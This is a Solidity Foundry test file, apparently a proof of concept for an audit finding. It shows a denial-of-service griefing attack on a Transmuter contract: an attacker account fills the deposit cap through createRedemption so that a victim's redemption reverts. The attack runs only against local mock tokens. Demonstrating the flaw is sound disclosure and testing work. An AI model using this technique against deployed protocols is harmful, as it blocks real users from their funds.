// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

import "../src/Transmuter.sol";
import "../src/interfaces/ITransmuter.sol";
import "../src/interfaces/IAlchemistV3.sol";

/// Minimal mock ERC20 used for synthetic token & yield token
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insuf");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (msg.sender != from) {
            require(allowed >= amount, "allow insuf");
            allowance[from][msg.sender] = allowed - amount;
        }
        require(balanceOf[from] >= amount, "bal insuf");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    /// burn used by Transmuter via TokenUtils.safeBurn (we expose a simple burn)
    function burn(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "burn insuf");
        balanceOf[msg.sender] -= amount;
    }
}

/// Minimal mock Alchemist implementing only the methods Transmuter calls.
contract MockAlchemist is IAlchemistV3 {
    MockERC20 public yieldToken;
    MockERC20 public underlying;
    uint256 public syntheticsIssued;

    constructor(MockERC20 _yield, MockERC20 _underlying) {
        yieldToken = _yield;
        underlying = _underlying;
        syntheticsIssued = 1e30; // large by default
    }

    // ---- Functions used by Transmuter ----
    function totalSyntheticsIssued() external view override returns (uint256) {
        return syntheticsIssued;
    }

    function myt() external view override returns (address) {
        return address(yieldToken);
    }

    function getTotalUnderlyingValue() external view override returns (uint256) {
        // pretend there's a lot of underlying
        return 1e30;
    }

    function convertYieldTokensToUnderlying(uint256 amount) external view override returns (uint256) {
        // 1:1 for test simplicity
        return amount;
    }

    function convertYieldTokensToDebt(uint256 amount) external view override returns (uint256) {
        // no debt for simplicity
        return 0;
    }

    function convertDebtTokensToYield(uint256 amount) external view override returns (uint256) {
        // 1:1
        return amount;
    }

    function redeem(uint256 amount) external override {
        // mint yield tokens to caller (simulate redeem)
        yieldToken.mint(msg.sender, amount);
    }

    function reduceSyntheticsIssued(uint256 amount) external override {
        // reduce tracked synthetics; guard underflow
        if (syntheticsIssued >= amount) syntheticsIssued -= amount;
        else syntheticsIssued = 0;
    }

    function setTransmuterTokenBalance(uint256) external override {
        // no-op for mock
    }

    function underlyingToken() external view override returns (address) {
        return address(underlying);
    }

    // fallback to avoid unexpected interface mismatches during tests
    fallback() external payable {
        revert("unexpected call");
    }

    receive() external payable {}
}

/// Test contract demonstrating griefing
contract TransmuterGriefingTest is Test {
    Transmuter public transmuter;
    MockERC20 public synthetic;
    MockERC20 public yieldToken;
    MockERC20 public underlying;
    MockAlchemist public alchemist;

    address public attacker = address(0xA11);
    address public victim = address(0xBEEF);
    address public feeReceiver = address(0xFEE);

    function setUp() public {
        // deploy mocks
        synthetic = new MockERC20("Synth", "SYN");
        yieldToken = new MockERC20("Yield", "YLD");
        underlying = new MockERC20("Underlying", "UND");

        // deploy mock alchemist
        alchemist = new MockAlchemist(yieldToken, underlying);

        // prepare initialization params (use ITransmuter struct)
        ITransmuter.TransmuterInitializationParams memory params = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(synthetic),
            timeToTransmute: 100,       // arbitrary
            transmutationFee: 50,       // 0.5% if BPS=10000
            exitFee: 10,                // 0.1%
            feeReceiver: feeReceiver
        });

        // deploy transmuter (msg.sender becomes admin)
        transmuter = new Transmuter(params);

        // set alchemist in transmuter (admin function)
        transmuter.setAlchemist(address(alchemist));

        // set deposit cap modest for test clarity
        transmuter.setDepositCap(1e18 * 10); // 10 synth

        // fund attacker and victim with synthetic tokens
        synthetic.mint(attacker, 1e18 * 20); // 20 synth
        synthetic.mint(victim, 1e18 * 1);    // 1 synth

        // victim approves transmuter
        vm.prank(victim);
        synthetic.approve(address(transmuter), type(uint256).max);

        // attacker approves transmuter
        vm.prank(attacker);
        synthetic.approve(address(transmuter), type(uint256).max);
    }

    /// Attacker fills the deposit cap, victim is blocked (revert)
    function test_griefing_blocks_victim() public {
        // Attacker fills the cap with a single createRedemption
        uint256 fillAmount = transmuter.depositCap() - transmuter.totalLocked();
        vm.prank(attacker);
        transmuter.createRedemption(fillAmount);

        // Sanity: totalLocked equals depositCap now
        assertEq(transmuter.totalLocked(), transmuter.depositCap());

        // Victim tries to create a redemption and should revert with DepositCapReached()
        vm.prank(victim);
        // selector for custom error DepositCapReached() -> bytes4(keccak256("DepositCapReached()"))
        vm.expectRevert(abi.encodePacked(bytes4(keccak256("DepositCapReached()"))));
        transmuter.createRedemption(1e18);
    }

    /// If attacker claims (frees the cap), victim can then create redemption successfully
    function test_after_attacker_claim_victim_can_create() public {
        // Attacker fills the cap
        uint256 fillAmount = transmuter.depositCap() - transmuter.totalLocked();
        vm.prank(attacker);
        transmuter.createRedemption(fillAmount);

        // Attacker now claims to free the slot.
        // Note: claimRedemption reverts if called in same block as creation.
        // Advance block so claim is allowed.
        vm.roll(block.number + 1);

        vm.prank(attacker);
        // The first minted id is 1 in this test (nonce starts at 0 then ++). We assume it's 1.
        transmuter.claimRedemption(1);

        // Now totalLocked should have decreased (== 0)
        assertEq(transmuter.totalLocked(), 0);

        // Victim can now create redemption
        vm.prank(victim);
        transmuter.createRedemption(1e18);

        assertEq(transmuter.totalLocked(), 1e18);
    }
}
